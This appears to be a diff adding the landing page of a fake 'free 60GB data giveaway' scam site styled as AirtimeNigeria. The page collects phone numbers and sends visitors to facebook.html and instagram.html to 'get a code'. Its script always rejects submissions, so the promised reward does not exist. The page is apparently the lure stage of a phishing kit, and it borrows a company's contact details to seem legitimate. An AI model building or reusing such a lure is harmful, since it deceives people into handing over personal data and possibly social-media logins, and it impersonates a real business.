@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self';">
+
+    <title>airtimenigeria</title>
+    <style>
+        body {
+            text-align: center; /* Center align all text content */
+            margin: 0;
+            padding: 5px 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .banner {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .banner img {
+            width: 100%;
+            height: auto; /* Maintain aspect ratio */ 
+            max-height: 550px;
+            object-position: top; /* Ensure the image covers the area without distortion */
+        }
+
+        .top {
+            background-color: aqua;
+            font-weight: bold;
+            padding: 23px 0;
+            color: black;
+        }
+
+        h1 {
+            font-weight: bold;
+            margin: 28px 0;
+        }
+
+        .note {
+            color: red;
+            margin: 28px 0 45px 0;
+        }
+
+        button {
+            background-color: yellow;
+            color: rgb(12, 0, 0);
+            font-weight: bold;
+            font-size: large;
+            border: none;
+            border-radius: 17px;
+            padding: 12px 120px;
+        }
+
+        button:hover {
+            background-color: rgb(224, 224, 11);
+            cursor: pointer;
+        }
+
+        .footer {
+            background-image: url(images/bg.png);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-size: cover; 
+            background-repeat: no-repeat;
+            background-position: center;
+            color: rgb(0, 0, 0); 
+            padding: 15px 10px;
+        }
+
+        .call {
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .call img {
+            width: 30px;
+            height: 30px;
+            margin-right: 5px;
+        }
+
+        .call a {
+            color: black;
+            text-decoration: none;
+        }
+
+        .code-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            min-height: 50vh; /* Adjust as needed */
+        }
+
+        .codeDiv {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: left; /* Align text to the left within codeDiv */
+        }
+
+        .codeDiv h4 {
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+
+        .codeDiv label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .codeDiv input[type="tel"],
+        .codeDiv input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .codeDiv input[type="tel"]:focus,
+        .codeDiv input[type="text"]:focus {
+            border-color: #3897f0;
+            outline: none;
+            box-shadow: 0 0 5px rgba(56, 151, 240, 0.5);
+        }
+
+        .codeDiv p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .codeDiv p span {
+            color: #3897f0;
+            font-weight: bold;
+        }
+
+        .codeDiv p span:hover {
+            text-decoration: underline;
+            cursor: pointer;
+            color: #8e38f0;
+        }
+
+        .codeDiv #Notee {
+          display: none;
+          color: red;
+        }
+
+        .codeDiv button {
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .codeDiv button:hover {
+            background-color: #3178c6;
+        }
+
+        .alertBox {
+          display: none; 
+          position: fixed;
+          left: 0;
+          top: 0;
+          width: 100%;
+          height: 100%;
+          background-color: rgba(0, 0, 0, 0.5);
+          justify-content: center;
+          align-items: center;
+        }
+
+        .alertContent {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: left;
+            width: 300px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        #cancel {
+          position: relative;
+          top: -115px;
+          left: 288px;
+          background-color: transparent;
+          border: #333 solid 0.5px;
+          width: 20px;
+          padding: 6px 12px;
+          padding-right: 2px;
+        }
+
+        #cancel:hover {
+          background-color: #f83939;
+          color: #fff;
+          cursor: pointer;
+        }
+
+        .social-button {
+            min-width: 11rem;
+            display: flex;
+            justify-content: center;
+
+            height:2.1rem;
+            padding: 0.8rem 0.375rem 0;
+            margin-bottom: 2rem;
+            background: #eee;
+            border-radius: 0.25rem;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+            perspective: 30rem;
+        }
+        .cover {
+            transform-origin: center bottom;
+            transform-style: preserve-3d;
+            text-align: center;
+            z-index: 99;
+        }
+        .cover, .cover > * {
+            position: absolute;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+        }
+        .cover svg{
+            width: 40px;
+            height:40px;
+            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.25));
+        }
+        .twitter .cover svg{
+            width: 35px;
+            height:35px;
+            margin-top: 6px;
+            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.25));
+        }
+        .inner, .outer {
+            border-radius: 0.25rem;
+            background-image: linear-gradient(to bottom, transparent 0%, rgba(0,0,0,0.1) 100%);
+        }
+        .outer {
+            transform:translateZ(0.25rem);
+        }
+        .edge {
+            top:0.25rem;
+            height:0.25rem;
+            transform:rotateX(90deg);
+            transform-origin: center top;
+        }
+        .social-button:hover .cover {
+            transform:rotateX(-120deg);
+        }
+        .social-button, .social-button div {
+            transition-duration: 0.7s;
+            transition-timing-function: ease;
+        }
+        .shadow {
+            position: absolute;
+            top:100%;
+            left:0;
+            width:100%;
+            height:3.2rem;
+            border-radius: 0.5rem;
+            opacity: 0;
+            background-image: linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, transparent 100%);
+            transform:rotateX(90deg);
+            transform-origin: center top;
+        }
+        .social-button:hover .shadow {
+            transform: rotateX(45deg) scale(0.95);
+            opacity: 1;
+        }
+
+        .twitter .inner {
+          background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+        .twitter .outer {
+          background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+        .twitter .edge {
+          background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+        .twitter a {
+          background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+          filter: brightness(1.1);
+          color: white;
+          text-decoration: none;
+          padding: 6px;
+          border-radius: 4px;
+        }
+        .facebook .inner {
+            background-color: #3b5998;
+        }
+        .facebook .outer {
+            background-color: #476ab4;
+            
+        }
+        .facebook .edge {
+            background-color: #2f477c;
+        }
+        .facebook a {
+          background-color: #061d66;
+          color: white;
+          text-decoration: none;
+          padding: 6px;
+          border-radius: 4px;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <img src="images/banner.png" alt="Banner">
+    </div>
+    <p class="top"><strong>#</strong>FREE 60GB DATA GIVEAWAY</p>
+    <div>
+        <h1>FREE 60GB DATA PLAN FOR ALL NETWORKS</h1>
+        <button id="showCodeDiv">CLICK HERE</button>
+        <div class="code-container" id="code-container">
+            <div class="codeDiv">
+                <h4>Input your phone number and special giveaway code to receive reward </h4>
+                <div>
+                    <label for="phNum">Phone number:</label>
+                    <input type="tel" placeholder="Phone number" id="phNum" maxlength="11" minlength="11" ><br>
+                    <label for="sgcCode">Special code:</label>
+                    <input type="text" placeholder="Your code" id="sgcCode" maxlength="6" pattern="\d{0,6}">
+                </div>
+                <p>Don't have a code? Click <span id="showAlert">HERE</span> to get one</p>
+                <button id="submit">Submit</button>
+                <div>
+                  <p id="Notee">!!!The available phone number is not eligible for this giveaway!!!</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="customAlert" class="alertBox">
+          <div class="alertContent">
+            <h3>retreive unique code</h3>
+            <p>retreive code via: </p>
+            <div id="cancel">X</div>
+            <div class="facebook social-button">
+              <div>
+                <a href="facebook.html" target="_blank" class="twitter-follow-button" data-size="large" data-show-count="false">GET CODE</a>
+              </div>
+              <div class="cover">
+                  <div class="inner">
+                          <svg viewbox="0 0 512 512">
+                                  <path fill="white" d="M211.9 197.4h-36.7v59.9h36.7V433.1h70.5V256.5h49.2l5.2-59.1h-54.4c0 0 0-22.1 0-33.7 0-13.9 2.8-19.5 16.3-19.5 10.9 0 38.2 0 38.2 0V82.9c0 0-40.2 0-48.8 0 -52.5 0-76.1 23.1-76.1 67.3C211.9 188.8 211.9 197.4 211.9 197.4z"></path>
+                                </svg> 
+                  </div>
+                  <div class="edge"></div>
+                  <div class="outer">
+                          <svg viewbox="0 0 512 512">
+                                  <path fill="white" d="M211.9 197.4h-36.7v59.9h36.7V433.1h70.5V256.5h49.2l5.2-59.1h-54.4c0 0 0-22.1 0-33.7 0-13.9 2.8-19.5 16.3-19.5 10.9 0 38.2 0 38.2 0V82.9c0 0-40.2 0-48.8 0 -52.5 0-76.1 23.1-76.1 67.3C211.9 188.8 211.9 197.4 211.9 197.4z"></path>
+                                </svg>
+                  </div>
+              </div>
+              <div class="shadow"></div>
+            </div>
+            <div class="twitter social-button">
+              <div>
+                <a href="instagram.html" target="_blank" class="twitter-follow-button" data-size="large" data-show-count="false">GET CODE</a>
+              </div>
+              <div class="cover">
+                  <div class="inner">
+                    <svg xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 512 512"><path fill="#fff" fill-rule="nonzero" d="M170.663 256.157c-.083-47.121 38.055-85.4 85.167-85.483 47.121-.092 85.407 38.03 85.499 85.16.091 47.129-38.047 85.4-85.176 85.492-47.112.09-85.399-38.039-85.49-85.169zm-46.108.091c.141 72.602 59.106 131.327 131.69 131.186 72.592-.141 131.35-59.09 131.209-131.692-.141-72.577-59.114-131.335-131.715-131.194-72.585.141-131.325 59.115-131.184 131.7zm237.104-137.091c.033 16.953 13.817 30.681 30.772 30.648 16.961-.033 30.689-13.811 30.664-30.764-.033-16.954-13.818-30.69-30.78-30.657-16.962.033-30.689 13.818-30.656 30.773zm-208.696 345.4c-24.958-1.087-38.511-5.234-47.543-8.709-11.961-4.629-20.496-10.178-29.479-19.094-8.966-8.95-14.532-17.46-19.202-29.397-3.508-9.032-7.73-22.569-8.9-47.527-1.269-26.982-1.559-35.077-1.683-103.432-.133-68.339.116-76.434 1.294-103.441 1.069-24.942 5.242-38.512 8.709-47.536 4.628-11.977 10.161-20.496 19.094-29.479 8.949-8.982 17.459-14.532 29.403-19.202 9.025-3.525 22.561-7.714 47.511-8.9 26.998-1.277 35.085-1.551 103.423-1.684 68.353-.132 76.448.108 103.456 1.295 24.94 1.086 38.51 5.217 47.527 8.709 11.968 4.628 20.503 10.144 29.478 19.094 8.974 8.95 14.54 17.443 19.21 29.412 3.524 9 7.714 22.553 8.892 47.494 1.285 26.999 1.576 35.095 1.7 103.433.132 68.355-.117 76.451-1.302 103.441-1.087 24.958-5.226 38.52-8.709 47.561-4.629 11.952-10.161 20.487-19.103 29.471-8.941 8.949-17.451 14.531-29.403 19.201-9.009 3.517-22.561 7.714-47.494 8.9-26.998 1.269-35.086 1.559-103.448 1.684-68.338.132-76.424-.125-103.431-1.294zM149.977 1.773c-27.239 1.285-45.843 5.648-62.101 12.018-16.829 6.561-31.095 15.354-45.286 29.604C28.381 57.653 19.655 71.944 13.144 88.79c-6.303 16.299-10.575 34.912-11.778 62.168C.172 178.264-.102 186.973.031 256.489c.133 69.508.439 78.234 1.741 105.547 1.302 27.231 5.649 45.828 12.019 62.093 6.569 16.83 15.353 31.088 29.611 45.288 14.25 14.201 28.55 22.918 45.404 29.438 16.282 6.295 34.902 10.583 62.15 11.778 27.305 1.203 36.022 1.468 105.521 1.335 69.532-.132 78.25-.439 105.555-1.733 27.239-1.303 45.826-5.665 62.1-12.019 16.829-6.586 31.095-15.353 45.288-29.611 14.191-14.251 22.917-28.55 29.428-45.405 6.304-16.282 10.592-34.903 11.777-62.134 1.195-27.322 1.478-36.048 1.344-105.556-.133-69.516-.447-78.225-1.741-105.523-1.294-27.255-5.657-45.844-12.019-62.118-6.577-16.829-15.352-31.079-29.602-45.287-14.25-14.192-28.55-22.935-45.404-29.429-16.29-6.305-34.903-10.601-62.15-11.779C333.747.164 325.03-.102 255.506.031c-69.507.133-78.224.431-105.529 1.742z"/></svg>
+                  </div>
+                  <div class="edge"></div>
+                  <div class="outer">
+                    <svg xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 512 512"><path fill="#fff" fill-rule="nonzero" d="M170.663 256.157c-.083-47.121 38.055-85.4 85.167-85.483 47.121-.092 85.407 38.03 85.499 85.16.091 47.129-38.047 85.4-85.176 85.492-47.112.09-85.399-38.039-85.49-85.169zm-46.108.091c.141 72.602 59.106 131.327 131.69 131.186 72.592-.141 131.35-59.09 131.209-131.692-.141-72.577-59.114-131.335-131.715-131.194-72.585.141-131.325 59.115-131.184 131.7zm237.104-137.091c.033 16.953 13.817 30.681 30.772 30.648 16.961-.033 30.689-13.811 30.664-30.764-.033-16.954-13.818-30.69-30.78-30.657-16.962.033-30.689 13.818-30.656 30.773zm-208.696 345.4c-24.958-1.087-38.511-5.234-47.543-8.709-11.961-4.629-20.496-10.178-29.479-19.094-8.966-8.95-14.532-17.46-19.202-29.397-3.508-9.032-7.73-22.569-8.9-47.527-1.269-26.982-1.559-35.077-1.683-103.432-.133-68.339.116-76.434 1.294-103.441 1.069-24.942 5.242-38.512 8.709-47.536 4.628-11.977 10.161-20.496 19.094-29.479 8.949-8.982 17.459-14.532 29.403-19.202 9.025-3.525 22.561-7.714 47.511-8.9 26.998-1.277 35.085-1.551 103.423-1.684 68.353-.132 76.448.108 103.456 1.295 24.94 1.086 38.51 5.217 47.527 8.709 11.968 4.628 20.503 10.144 29.478 19.094 8.974 8.95 14.54 17.443 19.21 29.412 3.524 9 7.714 22.553 8.892 47.494 1.285 26.999 1.576 35.095 1.7 103.433.132 68.355-.117 76.451-1.302 103.441-1.087 24.958-5.226 38.52-8.709 47.561-4.629 11.952-10.161 20.487-19.103 29.471-8.941 8.949-17.451 14.531-29.403 19.201-9.009 3.517-22.561 7.714-47.494 8.9-26.998 1.269-35.086 1.559-103.448 1.684-68.338.132-76.424-.125-103.431-1.294zM149.977 1.773c-27.239 1.285-45.843 5.648-62.101 12.018-16.829 6.561-31.095 15.354-45.286 29.604C28.381 57.653 19.655 71.944 13.144 88.79c-6.303 16.299-10.575 34.912-11.778 62.168C.172 178.264-.102 186.973.031 256.489c.133 69.508.439 78.234 1.741 105.547 1.302 27.231 5.649 45.828 12.019 62.093 6.569 16.83 15.353 31.088 29.611 45.288 14.25 14.201 28.55 22.918 45.404 29.438 16.282 6.295 34.902 10.583 62.15 11.778 27.305 1.203 36.022 1.468 105.521 1.335 69.532-.132 78.25-.439 105.555-1.733 27.239-1.303 45.826-5.665 62.1-12.019 16.829-6.586 31.095-15.353 45.288-29.611 14.191-14.251 22.917-28.55 29.428-45.405 6.304-16.282 10.592-34.903 11.777-62.134 1.195-27.322 1.478-36.048 1.344-105.556-.133-69.516-.447-78.225-1.741-105.523-1.294-27.255-5.657-45.844-12.019-62.118-6.577-16.829-15.352-31.079-29.602-45.287-14.25-14.192-28.55-22.935-45.404-29.429-16.29-6.305-34.903-10.601-62.15-11.779C333.747.164 325.03-.102 255.506.031c-69.507.133-78.224.431-105.529 1.742z"/></svg> 
+                  </div>
+              </div>
+              <div class="shadow"></div>
+            </div>
+          </div>
+          
+        </div>
+        <p class="note">!!!Complete all steps correctly to receive reward</p>
+    </div>
+    <div class="footer">
+        <div>
+            <h2>Contact information</h2>
+            <h3>Head Office:</h3>
+            <p>
+                AirtimeNigeria.com<br>
+                Plot 9C, Police Housing Estate<br>
+                Ikot Eneobong (8 Miles),<br>
+                Calabar,<br>
+                Cross River State
+            </p>
+            <div class="callBox">
+                <div>
+                    <div class="call">
+                        <img src="images/call.png" >
+                        <a href="tel:+2347059090000">+234 705 90 90000</a>
+                    </div>
+                </div>
+                <div>
+                    <div class="call">
+                        <img src="images/email.png" >
+                        <a href="mailto:support@airtimenigeria.com">support@airtimenigeria.com</a>
+                    </div>
+                </div>
+            </div>
+            <h3>Opening Hours:</h3>
+            <p>Days of the Week</p>
+            <p>Mondays - Saturdays</p>
+            <h3>Opening Time</h3>
+            <p>8:00am</p>
+            <h3>Closing Time</h3>
+            <p>6:00pm</p>
+        </div>
+    </div>
+    <script>
+
+        let codeClicked = false
+
+      document.getElementById('showAlert').addEventListener('click', function() {
+          codeClicked = true
+
+          document.getElementById('customAlert').style.display = 'flex';
+      });
+
+      document.getElementById('cancel').addEventListener('click', function() {
+          // Hide the custom alert box
+          document.getElementById('customAlert').style.display = 'none';
+      });
+
+      let divButton = document.getElementById('showCodeDiv')
+      divButton.addEventListener('click', function() {
+          document.getElementById('code-container').style.display = 'flex';
+
+          divButton.style.display = 'none';
+      });
+
+      document.getElementById('phNum').addEventListener('input', function (e) {
+            const input = e.target;
+            const value = input.value.replace(/\D/g, ''); // Remove non-digit characters
+            input.value = value; // Update the input value
+        });
+
+        document.getElementById('submit').addEventListener('click', function() {
+            const phone = document.getElementById('phNum').value;
+            const code = document.getElementById('sgcCode').value;
+            const warn = document.getElementById('Notee');
+
+            if (!phone || !code) {
+                alert('Both fields are required.');
+            } else if (codeClicked === false) {
+                warn.textContent = "!!! Invalid secret code please try again with a valid code!!!"
+
+                warn.style.display = 'block';
+
+                alert("!!! Invalid secret code please try again with a valid code!!!")
+
+            } else {
+                warn.style.display = 'block';
+
+                alert("!!!The available phone number is not eligible for this giveaway!!!")
+            }
+        });
+
+
+    </script>
+</body>
+</html>
